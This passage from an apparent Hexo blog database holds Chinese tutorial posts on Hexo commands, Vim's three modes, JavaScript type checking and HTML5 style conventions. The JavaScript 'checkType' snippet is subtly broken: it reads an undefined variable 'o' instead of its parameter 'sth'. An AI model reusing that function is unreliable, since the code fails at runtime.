class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n"},{"id":"0809012","title":"常用的  Vim命令","date":"2017-08-22T08:09:18.000Z","_content":"\n#### <a>1. 简介</a>\n\n- `vim` 是从 `vi` 发展出来的一个文本编辑器，所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定会存在,但是目前我们使用比较多的是 `vim` 编辑器。\n- `vim` 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计:\n- `vim` 代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。\n- 简单的来说，`vi` 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。`vim` 则可以说是程序开发者的一项很好用的工具。\n\n#### <a>2. 使用</a>\n\n> 基本上 vi/vim 共分为三种模式，分别是`命令模式`（Command mode），`输入模式`（Insert mode）和`底线命令模式`（Last line mode）。 这三种模式的作用分别是：\n\n<strong>命令模式：</strong>\n- 用户刚刚启动 `vi/vim`，便进入了命令模式。\n- 此状态下敲击键盘动作会被 `Vim` 识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。以下是常用的几个命令：\n```\ni 切换到输入模式，以输入字符。\nx 删除当前光标所在处的字符。\n: 切换到底线命令模式，以在最底一行输入命令。\n```\n- 若想要编辑文本：启动 `Vim`，进入了命令模式，按下i，切换到输入模式。\n- 命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。\n\n<strong>输入模式：</strong>\n- 在命令模式下按下i就进入了输入模式。\n- 在输入模式中，可以使用以下按键：\n```\n字符按键以及Shift组合，输入字符\nENTER，回车键，换行\nBACK SPACE，退格键，删除光标前一个字符\nDEL，删除键，删除光标后一个字符\n方向键，在文本中移动光标\nHOME/END，移动光标到行首/行尾\nPage Up/Page Down，上/下翻页\nInsert，切换光标为输入/替换模式，光标将变成竖线/下划线\nESC，退出输入模式，切换到命令模式\n```\n\n<strong>底线命令模式：</strong>\n- 在命令模式下按下:（英文冒号）就进入了底线命令模式。\n- 底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。\n- 在底线命令模式中，基本的命令有（已经省略了冒号）：\n```\nq  退出程序\nw  保存文件\nwq 保存并推出\n```\n- 按ESC键可随时退出底线命令模式。\n\n`简单的说，我们可以将这三个模式想成底下的图标来表示：`\n<img src=\"/images/vim.png\">\n\n<!-- #### <a>3. Vim键盘使用</a> -->\n\n<!-- <table>\n    <thead>\n        <tr>\n            <th></th>\n            <th></th>\n            <th></th>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td></td>\n            <td></td>\n            <td></td>\n        </tr>\n    </tbody>\n</table> -->","source":"_posts/0809012_常用的Vim命令.md","raw":"---\nid: 0809012\ntitle: 常用的  Vim命令\ndate: 2017-08-22 16:09:18\ntags:\n    - vim\ncategories:\n---\n\n#### <a>1. 简介</a>\n\n- `vim` 是从 `vi` 发展出来的一个文本编辑器，所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定会存在,但是目前我们使用比较多的是 `vim` 编辑器。\n- `vim` 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计:\n- `vim` 代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。\n- 简单的来说，`vi` 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。`vim` 则可以说是程序开发者的一项很好用的工具。\n\n#### <a>2. 使用</a>\n\n> 基本上 vi/vim 共分为三种模式，分别是`命令模式`（Command mode），`输入模式`（Insert mode）和`底线命令模式`（Last line mode）。 这三种模式的作用分别是：\n\n<strong>命令模式：</strong>\n- 用户刚刚启动 `vi/vim`，便进入了命令模式。\n- 此状态下敲击键盘动作会被 `Vim` 识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。以下是常用的几个命令：\n```\ni 切换到输入模式，以输入字符。\nx 删除当前光标所在处的字符。\n: 切换到底线命令模式，以在最底一行输入命令。\n```\n- 若想要编辑文本：启动 `Vim`，进入了命令模式，按下i，切换到输入模式。\n- 命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。\n\n<strong>输入模式：</strong>\n- 在命令模式下按下i就进入了输入模式。\n- 在输入模式中，可以使用以下按键：\n```\n字符按键以及Shift组合，输入字符\nENTER，回车键，换行\nBACK SPACE，退格键，删除光标前一个字符\nDEL，删除键，删除光标后一个字符\n方向键，在文本中移动光标\nHOME/END，移动光标到行首/行尾\nPage Up/Page Down，上/下翻页\nInsert，切换光标为输入/替换模式，光标将变成竖线/下划线\nESC，退出输入模式，切换到命令模式\n```\n\n<strong>底线命令模式：</strong>\n- 在命令模式下按下:（英文冒号）就进入了底线命令模式。\n- 底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。\n- 在底线命令模式中，基本的命令有（已经省略了冒号）：\n```\nq  退出程序\nw  保存文件\nwq 保存并推出\n```\n- 按ESC键可随时退出底线命令模式。\n\n`简单的说，我们可以将这三个模式想成底下的图标来表示：`\n<img src=\"/images/vim.png\">\n\n<!-- #### <a>3. Vim键盘使用</a> -->\n\n<!-- <table>\n    <thead>\n        <tr>\n            <th></th>\n            <th></th>\n            <th></th>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td></td>\n            <td></td>\n            <td></td>\n        </tr>\n    </tbody>\n</table> -->","slug":"0809012_常用的Vim命令","published":1,"updated":"2018-03-26T12:18:30.991Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvtp000es4c0cyyh88rt","content":"<h4 id=\"1-简介\"><a href=\"#1-简介\" class=\"headerlink\" title=\"1. 简介\"></a><a>1. 简介</a></h4><ul>\n<li><code>vim</code> 是从 <code>vi</code> 发展出来的一个文本编辑器，所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定会存在,但是目前我们使用比较多的是 <code>vim</code> 编辑器。</li>\n<li><code>vim</code> 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计:</li>\n<li><code>vim</code> 代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。</li>\n<li>简单的来说，<code>vi</code> 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。<code>vim</code> 则可以说是程序开发者的一项很好用的工具。</li>\n</ul>\n<h4 id=\"2-使用\"><a href=\"#2-使用\" class=\"headerlink\" title=\"2. 使用\"></a><a>2. 使用</a></h4><blockquote>\n<p>基本上 vi/vim 共分为三种模式，分别是<code>命令模式</code>（Command mode），<code>输入模式</code>（Insert mode）和<code>底线命令模式</code>（Last line mode）。 这三种模式的作用分别是：</p>\n</blockquote>\n<p><strong>命令模式：</strong></p>\n<ul>\n<li>用户刚刚启动 <code>vi/vim</code>，便进入了命令模式。</li>\n<li><p>此状态下敲击键盘动作会被 <code>Vim</code> 识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。以下是常用的几个命令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i 切换到输入模式，以输入字符。</span><br><span class=\"line\">x 删除当前光标所在处的字符。</span><br><span class=\"line\">: 切换到底线命令模式，以在最底一行输入命令。</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>若想要编辑文本：启动 <code>Vim</code>，进入了命令模式，按下i，切换到输入模式。</p>\n</li>\n<li>命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。</li>\n</ul>\n<p><strong>输入模式：</strong></p>\n<ul>\n<li>在命令模式下按下i就进入了输入模式。</li>\n<li>在输入模式中，可以使用以下按键：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符按键以及Shift组合，输入字符</span><br><span class=\"line\">ENTER，回车键，换行</span><br><span class=\"line\">BACK SPACE，退格键，删除光标前一个字符</span><br><span class=\"line\">DEL，删除键，删除光标后一个字符</span><br><span class=\"line\">方向键，在文本中移动光标</span><br><span class=\"line\">HOME/END，移动光标到行首/行尾</span><br><span class=\"line\">Page Up/Page Down，上/下翻页</span><br><span class=\"line\">Insert，切换光标为输入/替换模式，光标将变成竖线/下划线</span><br><span class=\"line\">ESC，退出输入模式，切换到命令模式</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>底线命令模式：</strong></p>\n<ul>\n<li>在命令模式下按下:（英文冒号）就进入了底线命令模式。</li>\n<li>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</li>\n<li><p>在底线命令模式中，基本的命令有（已经省略了冒号）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">q  退出程序</span><br><span class=\"line\">w  保存文件</span><br><span class=\"line\">wq 保存并推出</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>按ESC键可随时退出底线命令模式。</p>\n</li>\n</ul>\n<p><code>简单的说，我们可以将这三个模式想成底下的图标来表示：</code><br><img src=\"/images/vim.png\"></p>\n<!-- #### <a>3. Vim键盘使用</a> -->\n<!-- <table>\n    <thead>\n        <tr>\n            <th></th>\n            <th></th>\n            <th></th>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td></td>\n            <td></td>\n            <td></td>\n        </tr>\n    </tbody>\n</table> -->","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-简介\"><a href=\"#1-简介\" class=\"headerlink\" title=\"1. 简介\"></a><a>1. 简介</a></h4><ul>\n<li><code>vim</code> 是从 <code>vi</code> 发展出来的一个文本编辑器，所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定会存在,但是目前我们使用比较多的是 <code>vim</code> 编辑器。</li>\n<li><code>vim</code> 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计:</li>\n<li><code>vim</code> 代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。</li>\n<li>简单的来说，<code>vi</code> 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。<code>vim</code> 则可以说是程序开发者的一项很好用的工具。</li>\n</ul>\n<h4 id=\"2-使用\"><a href=\"#2-使用\" class=\"headerlink\" title=\"2. 使用\"></a><a>2. 使用</a></h4><blockquote>\n<p>基本上 vi/vim 共分为三种模式，分别是<code>命令模式</code>（Command mode），<code>输入模式</code>（Insert mode）和<code>底线命令模式</code>（Last line mode）。 这三种模式的作用分别是：</p>\n</blockquote>\n<p><strong>命令模式：</strong></p>\n<ul>\n<li>用户刚刚启动 <code>vi/vim</code>，便进入了命令模式。</li>\n<li><p>此状态下敲击键盘动作会被 <code>Vim</code> 识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。以下是常用的几个命令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i 切换到输入模式，以输入字符。</span><br><span class=\"line\">x 删除当前光标所在处的字符。</span><br><span class=\"line\">: 切换到底线命令模式，以在最底一行输入命令。</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>若想要编辑文本：启动 <code>Vim</code>，进入了命令模式，按下i，切换到输入模式。</p>\n</li>\n<li>命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。</li>\n</ul>\n<p><strong>输入模式：</strong></p>\n<ul>\n<li>在命令模式下按下i就进入了输入模式。</li>\n<li>在输入模式中，可以使用以下按键：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符按键以及Shift组合，输入字符</span><br><span class=\"line\">ENTER，回车键，换行</span><br><span class=\"line\">BACK SPACE，退格键，删除光标前一个字符</span><br><span class=\"line\">DEL，删除键，删除光标后一个字符</span><br><span class=\"line\">方向键，在文本中移动光标</span><br><span class=\"line\">HOME/END，移动光标到行首/行尾</span><br><span class=\"line\">Page Up/Page Down，上/下翻页</span><br><span class=\"line\">Insert，切换光标为输入/替换模式，光标将变成竖线/下划线</span><br><span class=\"line\">ESC，退出输入模式，切换到命令模式</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>底线命令模式：</strong></p>\n<ul>\n<li>在命令模式下按下:（英文冒号）就进入了底线命令模式。</li>\n<li>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</li>\n<li><p>在底线命令模式中，基本的命令有（已经省略了冒号）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">q  退出程序</span><br><span class=\"line\">w  保存文件</span><br><span class=\"line\">wq 保存并推出</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>按ESC键可随时退出底线命令模式。</p>\n</li>\n</ul>\n<p><code>简单的说，我们可以将这三个模式想成底下的图标来表示：</code><br><img src=\"/images/vim.png\"></p>\n<!-- #### <a>3. Vim键盘使用</a> -->\n<!-- <table>\n    <thead>\n        <tr>\n            <th></th>\n            <th></th>\n            <th></th>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td></td>\n            <td></td>\n            <td></td>\n        </tr>\n    </tbody>\n</table> -->"},{"id":"0809014","title":"JavaScript 类型检测","date":"2016-10-05T02:58:37.000Z","_content":"\n一个简单有用的js类型检测的方法：\n\n```javascript\nfunction checkType(sth) {\n    return Object.prototype.toString.call(o)\n    .match(/(\\w+)\\]$/)[1]\n    .toLowerCase();\n}\n\ncheckType({})               // object\ncheckType([])               // array\ncheckType(function(){})     // function\ncheckType(1)                // number\ncheckType(+'3')             // number\ncheckType(3+'')             // string\n```","source":"_posts/0809014_JavaScript类型检测.md","raw":"---\nid: 0809014\ntitle: JavaScript 类型检测\ndate: 2016-10-05 10:58:37\ntags:\n    - JavaScript\ncategories:\n---\n\n一个简单有用的js类型检测的方法：\n\n```javascript\nfunction checkType(sth) {\n    return Object.prototype.toString.call(o)\n    .match(/(\\w+)\\]$/)[1]\n    .toLowerCase();\n}\n\ncheckType({})               // object\ncheckType([])               // array\ncheckType(function(){})     // function\ncheckType(1)                // number\ncheckType(+'3')             // number\ncheckType(3+'')             // string\n```","slug":"0809014_JavaScript类型检测","published":1,"updated":"2018-03-16T10:34:48.783Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvtr000gs4c02tco6gmi","content":"<p>一个简单有用的js类型检测的方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkType</span>(<span class=\"params\">sth</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.prototype.toString.call(o)</span><br><span class=\"line\">    .match(<span class=\"regexp\">/(\\w+)\\]$/</span>)[<span class=\"number\">1</span>]</span><br><span class=\"line\">    .toLowerCase();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">checkType(&#123;&#125;)               <span class=\"comment\">// object</span></span><br><span class=\"line\">checkType([])               <span class=\"comment\">// array</span></span><br><span class=\"line\">checkType(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;)     <span class=\"comment\">// function</span></span><br><span class=\"line\">checkType(<span class=\"number\">1</span>)                <span class=\"comment\">// number</span></span><br><span class=\"line\">checkType(+<span class=\"string\">'3'</span>)             <span class=\"comment\">// number</span></span><br><span class=\"line\">checkType(<span class=\"number\">3</span>+<span class=\"string\">''</span>)             <span class=\"comment\">// string</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>一个简单有用的js类型检测的方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkType</span>(<span class=\"params\">sth</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.prototype.toString.call(o)</span><br><span class=\"line\">    .match(<span class=\"regexp\">/(\\w+)\\]$/</span>)[<span class=\"number\">1</span>]</span><br><span class=\"line\">    .toLowerCase();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">checkType(&#123;&#125;)               <span class=\"comment\">// object</span></span><br><span class=\"line\">checkType([])               <span class=\"comment\">// array</span></span><br><span class=\"line\">checkType(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;)     <span class=\"comment\">// function</span></span><br><span class=\"line\">checkType(<span class=\"number\">1</span>)                <span class=\"comment\">// number</span></span><br><span class=\"line\">checkType(+<span class=\"string\">'3'</span>)             <span class=\"comment\">// number</span></span><br><span class=\"line\">checkType(<span class=\"number\">3</span>+<span class=\"string\">''</span>)             <span class=\"comment\">// string</span></span><br></pre></td></tr></table></figure>"},{"id":"0809013","title":"HTML5 代码规范","date":"2017-05-04T08:12:08.000Z","_content":"\n#### <a>1、使用正确的文档类型</a>\n\n- 文档类型声明位于HTML文档的第一行：\n  ```html\n  <!DOCTYPE html>\n\n  <!-- 小写也是被允许的 -->\n  <!doctype html>\n  ```\n\n#### <a>2、使用小写标签名</a>\n\n- HTML5 标签名可以使用大写和小写字母，`推荐使用小写字母：`\n  - 混合了大小写的风格是非常糟糕的。\n  - 开发人员通常使用小写 (类似 XHTML)。\n  - 小写风格看起来更加清爽。\n  - 小写字母容易编写。\n\n  **不推荐：**\n  ```html\n  <SECTION> \n    <p>这是一个段落。</p>\n  </SECTION>\n  ```\n  **非常糟糕：**\n  ```html\n  <Section> \n    <p>这是一个段落。</p>\n  </SECTION>\n  ```\n  **推荐：**\n  ```html\n  <section> \n    <p>这是一个段落。</p>\n  </section>\n  ```\n\n#### <a>3、关闭HTML标签</a>\n\n- `双标签：` 在 HTML5 中, 你不一定要关闭所有标签 (例如 `<p>` 标签)，但建议每个标签都要添加关闭标签。\n  **不推荐：**\n  ```html\n  <section>\n    <p>这是一个段落。\n    <p>这是一个段落。\n  </section>\n  ```\n  **推荐：**\n  ```html\n  <section>\n    <p>这是一个段落。</p>\n    <p>这是一个段落。</p>\n  </section>\n  ```\n- `单标签：` 在 HTML5 中, 空的 HTML 标签也不一定要关闭：\n  ```html\n  <!-- 1、可以这么写： -->\n  <meta charset=\"utf-8\">\n\n  <!-- 2、也可以这么写： -->\n  <meta charset=\"utf-8\" />\n  ```\n  在 `XHTML` 和 `XML` 中斜线 (/) 是必须的。如果你期望 XML 软件使用你的页面，使用这种风格是非常好的。\n\n#### <a>4、标签的属性名和属性值</a>\n\n**HTML5 属性名允许使用大写和小写字母。**\n\n- `推荐` 使用小写字母属性名:\n  - 同时使用大小写是非常不好的习惯。\n  - 开发人员通常使用小写 (类似 XHTML)。\n  - 小写风格看起来更加清爽。\n  - 小写字母容易编写。\n\n  ```html\n  <!-- 不推荐 -->\n  <div CLASS=\"menu\">\n\n  <!-- 推荐 -->\n  <div class=\"menu\">\n  ```\n\n**HTML5 属性值可以不用引号**\n\n- 属性值我们 `推荐` 使用引号：\n  - 如果属性值含有空格需要使用引号。\n  - 混合风格不推荐的，建议统一风格。\n  - 属性值使用引号易于阅读。\n\n  ```html\n  <!-- 以下实例属性值包含空格，没有使用引号，所以不能起作用: -->\n  <table class=table striped>\n  \n  <!-- 以下使用了双引号，是正确的： -->\n  <table class=\"table striped\">\n  ```\n\n#### <a>5、图片属性</a>\n\n- 图片通常使用 `alt` 属性。 在图片不能显示时，它能替代图片显示：\n  ```html\n  <img src=\"html5.gif\" alt=\"HTML5\" style=\"width:128px;height:128px\">\n  ```\n\n- 定义好图片的尺寸，在加载时可以预留指定空间，减少闪烁：\n  ```html\n  <img src=\"html5.gif\" alt=\"HTML5\" style=\"width:128px;height:128px\">\n  ```\n\n#### <a>6、空格和等号</a>\n    \n  - 等号前后可以使用空格\n  ```html  \n  <link rel = \"stylesheet\" href = \"styles.css\">\n  ```\n\n  - `推荐` 少用空格\n  ```html  \n  <link rel=\"stylesheet\" href=\"styles.css\">\n  ```\n\n#### <a>7、避免一行代码过长</a>\n\n- 使用 HTML 编辑器，左右滚动代码是不方便的。\n\n- 每行代码尽量少于 `80` 个字符。\n\n#### <a>8、空行和缩进</a>\n\n- 不要无缘无故添加空行。\n- 为每个逻辑功能块添加空行，这样更易于阅读。\n- 缩进使用两个空格，`不建议`使用 `TAB`。\n- 比较短的代码间不要使用不必要的空行和缩进。\n\n#### <a>9、省略 `<html>` `<body>` `<head>` ?</a>\n\n**在 `标准HTML5` 中， `<html>` `<body>` 和 `<head>` 标签是可以省略的，但我们都 `不推荐`。**\n\n- 以下写法是正确的：\n  ```html\n  <!DOCTYPE html>\n  <head>\n    <title>页面标题</title>\n  </head>\n\n  <h1>这是一个标题</h1>\n  <p>这是一个段落。</p>\n  ```\n\n- 为什么不推荐省略呢？\n  - `<html>` 标签是文档的根标签，用于描述页面的语言：\n  ```html\n  <!DOCTYPE html>\n  <html lang=\"zh\">\n  ```\n  - 声明语言是为了方便屏幕阅读器及搜索引擎。\n  - 省略 `<html>` 或 `<body>` 在 `DOM` 和 `XML` 软件中会崩溃。\n  - 省略 `<body>` 在旧版浏览器 `IE9`会发生错误。\n\n- 如果省略 `<head>` 标签，浏览器会将 `<body>` 之前的内容添加到一个默认的 `<head>` 标签上。\n\n#### <a>10、元标签</a>\n\n- `HTML5` 中 `<title>` 标签是必须的，标题名描述了页面的主题：\n  ```html\n  <title>菜鸟教程</title>\n  ```\n- 标题和语言可以让搜索引擎很快了解你页面的主题：\n  ```html\n  <!DOCTYPE html>\n  <html lang=\"zh\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <title>菜鸟教程</title>\n  </head>\n  ```\n\n#### <a>11、注释</a>\n\n- 注释可以写在 <!-- 和 --> 中:\n  ```html\n  <!-- 这是注释 -->\n  ```\n- 比较长的评论可以在 <!-- 和 --> 中分行写：\n  ```html\n  <!-- \n    这是一个较长评论。 这是 一个较长评论。这是一个较长评论。\n    这是 一个较长评论 这是一个较长评论。 这是 一个较长评论。\n  -->\n  ```\n- 长评论第一个字符缩进两个空格，更易于阅读。\n\n#### <a>12、样式表</a>\n\n- 样式表使用简洁的语法格式 ( `type` 属性不是必须的，在在加载 `js` 脚本时也可省去)：\n  ```html\n  <link rel=\"stylesheet\" href=\"styles.css\">\n  ```\n- 短的规则可以写成一行:\n  ```css\n  p.into {font-family: Verdana; font-size: 16em;}\n  ```\n- 长的规则可以写成多行:\n  ```css\n  body {\n    background-color: lightgrey;\n    font-family: \"Arial Black\", Helvetica, sans-serif;\n    font-size: 16em;\n    color: black;\n  }\n  ```\n  - 将左花括号与选择器放在同一行。\n  - 左花括号与选择器间添加一个空格。\n  - 使用两个空格来缩进。\n  - 冒号与属性值之间添加一个空格。\n  - 逗号和符号之后使用一个空格。\n  - 每个属性与值结尾都要使用分号。\n  - 只有属性值包含空格时才使用引号。\n  - 右花括号放在新的一行。\n  - 每行最多 80 个字符。\n  - 在逗号和冒号后添加空格是常用的一个规则。\n\n#### <a>13、使用小写文件名</a>\n\n- 大多 Web 服务器 (`Apache`, `Unix`) 对大小写敏感： `london.jpg` 不能通过 `London.jpg` 访问。\n- 其他 Web 服务器 (`Microsoft`, `IIS`) 对大小写不敏感： `london.jpg` 可以通过 `London.jpg` 或 `london.jpg` 访问。\n- 你必须保持统一的风格，我们 `建议统一使用小写` 的文件名。\n\n#### <a>14、`.htm` 和 `.html` 的区别</a>\n\n**`.htm` 和 `.html` 的扩展名文件本质上是没有区别的。浏览器和 Web 服务器都会把它们当作 `HTML` 文件来处理。**\n\n- `区别在于：`\n  - `.htm` 应用在早期 `DOS` 系统，系统现在或者只能有三个字符。\n  - 在 `Unix` 系统中后缀没有特别限制，一般用 `.html`。\n\n- `技术上的区别：`\n  - 如果一个 `URL` 没有指定文件名 (如 http://www.runoob.com/css/), 服务器会返回默认的文件名。通常默认文件名为 `index.html`, `index.htm`, `default.html`, 和 `default.htm`。\n  - 如果服务器只配置了 `index.html` 作为默认文件，你必须将文件命名为 `index.html`, 而不是 `index.htm`。\n  - 但是，通常服务器可以设置多个默认文件，你可以根据需要设置默认文件名。\n  - `无论如何`，`HTML` 完整的后缀是 `.html`。\n\n<p style=\"text-align: right\">参考文档 [runoob](http://www.runoob.com/html/html5-syntax.html)</p>","source":"_posts/0809013_HTML5代码规范.md","raw":"---\nid: 0809013\ntitle: HTML5 代码规范\ndate: 2017-05-04 16:12:08\ntags:\n  - HTML5\ncategories:\n---\n\n#### <a>1、使用正确的文档类型</a>\n\n- 文档类型声明位于HTML文档的第一行：\n  ```html\n  <!DOCTYPE html>\n\n  <!-- 小写也是被允许的 -->\n  <!doctype html>\n  ```\n\n#### <a>2、使用小写标签名</a>\n\n- HTML5 标签名可以使用大写和小写字母，`推荐使用小写字母：`\n  - 混合了大小写的风格是非常糟糕的。\n  - 开发人员通常使用小写 (类似 XHTML)。\n  - 小写风格看起来更加清爽。\n  - 小写字母容易编写。\n\n  **不推荐：**\n  ```html\n  <SECTION> \n    <p>这是一个段落。</p>\n  </SECTION>\n  ```\n  **非常糟糕：**\n  ```html\n  <Section> \n    <p>这是一个段落。</p>\n  </SECTION>\n  ```\n  **推荐：**\n  ```html\n  <section> \n    <p>这是一个段落。</p>\n  </section>\n  ```\n\n#### <a>3、关闭HTML标签</a>\n\n- `双标签：` 在 HTML5 中, 你不一定要关闭所有标签 (例如 `<p>` 标签)，但建议每个标签都要添加关闭标签。\n  **不推荐：**\n  ```html\n  <section>\n    <p>这是一个段落。\n    <p>这是一个段落。\n  </section>\n  ```\n  **推荐：**\n  ```html\n  <section>\n    <p>这是一个段落。</p>\n    <p>这是一个段落。</p>\n  </section>\n  ```\n- `单标签：` 在 HTML5 中, 空的 HTML 标签也不一定要关闭：\n  ```html\n  <!-- 1、可以这么写： -->\n  <meta charset=\"utf-8\">\n\n  <!-- 2、也可以这么写： -->\n  <meta charset=\"utf-8\" />\n  ```\n  在 `XHTML` 和 `XML` 中斜线 (/) 是必须的。如果你期望 XML 软件使用你的页面，使用这种风格是非常好的。\n\n#### <a>4、标签的属性名和属性值</a>\n\n**HTML5 属性名允许使用大写和小写字母。**\n\n- `推荐` 使用小写字母属性名:\n  - 同时使用大小写是非常不好的习惯。\n  - 开发人员通常使用小写 (类似 XHTML)。\n  - 小写风格看起来更加清爽。\n  - 小写字母容易编写。\n\n  ```html\n  <!-- 不推荐 -->\n  <div CLASS=\"menu\">\n\n  <!-- 推荐 -->\n  <div class=\"menu\">\n  ```\n\n**HTML5 属性值可以不用引号**\n\n- 属性值我们 `推荐` 